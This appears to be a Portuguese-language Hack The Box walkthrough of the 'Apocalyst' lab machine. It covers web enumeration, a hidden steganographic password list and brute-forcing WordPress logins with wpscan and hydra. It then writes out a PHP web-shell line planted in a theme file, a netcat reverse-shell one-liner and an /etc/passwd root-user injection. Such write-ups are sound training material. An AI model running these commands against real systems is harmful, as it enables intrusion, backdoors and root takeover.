---
title: "Hack The Box - Apocalyst"
tags: [Linux,Medium,Web,WordPress,BurpSuite,Hydra,Wfuzz,Brute Force,Gobuster,Linpeas]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/57>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 2 portas abertas

> Porta 22 -> SSH

> Portas 80 -> Servidor Web

## Enumeração da porta 80

Abrindo a página verificamos o que tem nela (Porta 80)

Verificamos a página inicial do apache

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_web.png)

Ao verificarmos no código fonte verificamos várias referências a `apocalyst.htb`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_web_font.png)

Então adicionamos o domínio `apocalyst.htb` no /etc/hosts

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_hosts.png)

Ao atualizarmos a página conseguimos acesso ao blog

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_web1.png)

### Usando o cewl

Bom aqui é meio na adivinhação, há um diretório que não há em nenhuma wordlist senão no próprio site, então devemos criar um wordlist com o cewl e com ela tentar fazer um brute force na página

`cewl apocalyst.htb -w cewl.txt`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_cewl.png)

### Wfuzz

Rodamos o wfuzz pra descobrir o diretório "escondido"

> wfuzz -L -c -z file,cewl.txt --hc 404 --hh 157 http://apocalyst.htb/FUZZ

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_wfuzz.png)

Explicação parâmetros wfuzz

> -L --> Follow redirection, quando der 301 ele vai seguir pra página

> -c --> Mostrar com cores

> -z --> Indicar que vai ser através de wordlist

> --hc 404 --> Hide error 404

> --hh 157 --> Não vai mostrar os dietórios que aparecem com tamanho de 157

### Gobuster

Rodamos o gobuster na página pra verificar se encontramos algo de útil, apenas pra exemplificar a utilização da ferramenta, pq com o wfuzz já deu certo, utilizando essa wordlist que eu criei

> gobuster dir -u apocalyst.htb -w cewl.txt -t 50 -l -f > gobuster.txt

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_gobuster.png)

Explicação Gobuster

> dir -> Modo escaneamento de diretórios

> -u http://apocalyst.htb -> Url que vai ser escaneada

> -w -> A wordlist utilizada

> -t -> Aumentar o número de threads, pra ir mais 

> -f -> Follow redirection

> -l -> Adiciona um / no final de cada requisição

## Wpscan

Uma vez que identificamos que é um Wordpress rodamos o `wpscan` pra ver se conseguimos extrair algo da página, como nome de usuários, por exemplo

> wpscan --url http://apocalyst.htb -e vt,tt,u,ap

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_wpscan.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_wpscan1.png)

Explicação parâmetros do wpscan

> -e --> Enumerar

> vt,tt,u,ap --> Temas vulneráveis, timthumbs, usuários, todos os plugins (respectivamente)

Encontramos o usuário `falakari`

## /Rightiousness/

Entramos no diretório especificado e vimos que tem uma imagem, a mesma da tela inicial, mas o cara que fez essa máquina não iria deixar isso de propósito

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_right.png)

Baixamos essa imagem pra nossa máquina, pra poder trabalhar e ver se tem algo escondido nela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_image.png)

Com o `steghide` descobrimos um list.txt escondido dentro do arquivo

> steghide extract -sf image.jpg

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_image2.png)

Possivelmente se refere a uma lista de senhas, e pela lógica a senha do usuário *falakari*

Pra praticar iremos realizar esse brute-force de dois modos

## Brute Force

### Através do wpscan

Através do wpscan é simples, apenas adicionamos um parâmetro e ele já testa

> wpscan --url http://apocalyst.htb --passwords list.txt --usernames falaraki

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_wp.png)

Encontramos a senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_wp1.png)

> Username: falaraki, Password: Transclisiation

### Através do hydra

O hydra é bacana pq ele é versátil, da pra fazer vários tipos de brute force em diferentes aplicações com ele. Uma delas é em páginas web.

1º Identificar onde está o campo de login do site

Como eu sei que é wordpress, o campo de login vai estar em wp-login.php

> http://apocalyst.htb/wp-login.php

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_hydra.png)

2º Mandar uma requisição de login para o BurpSuite

Isso serve pra podermos pegar como está estruturado a requisição, por que o hydra vai reproduzir essa requisição do jeito dele

Enviamos a requisição

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_hydra1.png)

Recebemos no BurpSuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_hydra2.png)

#### Montando a requisição do hydra

> hydra -l falaraki -P list.txt apocalyst.htb http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fapocalyst.htb%2Fwp-admin%2F&testcookie=1:is incorrect"

Parâmetros

> -l -> Qual login

> -P -> Wordlist utilizada

> http-post-form -> É o método que está sendo utilizado para criação da requisição

> /wp-login.php -> Onde está o formulário pra preenchimento

Sempre separado por ":"

> ^USER^ e ^PASS^ -> Onde estão os campos de usuário e senha

> :is incorrect -> Uma mensagem de erro que de quando a requisição da ruim

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_hydra3.png)

Bom, agora vamos prosseguir, uma vez que já conseguimos acesso

# Exploração do WordPress

Vamos inciar logando no wordpress

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_wp2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_wp3.png)

Clicamos em `Appereance` - `Editor`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_wp4.png)

Abrimos o `header.php` na parte da direita

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_wp5.png)

Colocamos um código php malicioso ali e salvamos

> echo system($_REQUEST['cmd']);

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_wp6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_wp7.png)

Verificamos se deu certo, mandamos a requisição para o `BurpSuite`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_wp8.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_wp9.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_wp10.png)

## Reverse shell

Agora iremos conseguir um reverse shell, uma vez que já temos RCE na máquina

> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.119 443 >/tmp/f

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_wp11.png)

# Escalação de Privilégio

Como de costume vamos rodar o linpeas na máquina para procurar por pontos de escalação de privilégio

> https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_linpeas.png)

Passamos pra máquina e executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_linpeas0.png)

Encontramos que podemos escrever no `passwd`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_linpeas1.png)

## Gerando um hash ssl

Podemos gerar um hash ssl na Kali e colocar dentro do passwd

> openssl passwd -1 -salt apoc hackthebox

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_ssl.png)

Inserimos dentro do passwd

> echo "apoc:\$1\$apoc\$rT90d/Owh39NjPJCyG6mk1:0:0:apoc:/root:/bin/bash" >> /etc/passwd

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_ssl1.png)

### Logamos como root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_ssl2.png)

### Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-apocalyst/A_user.png)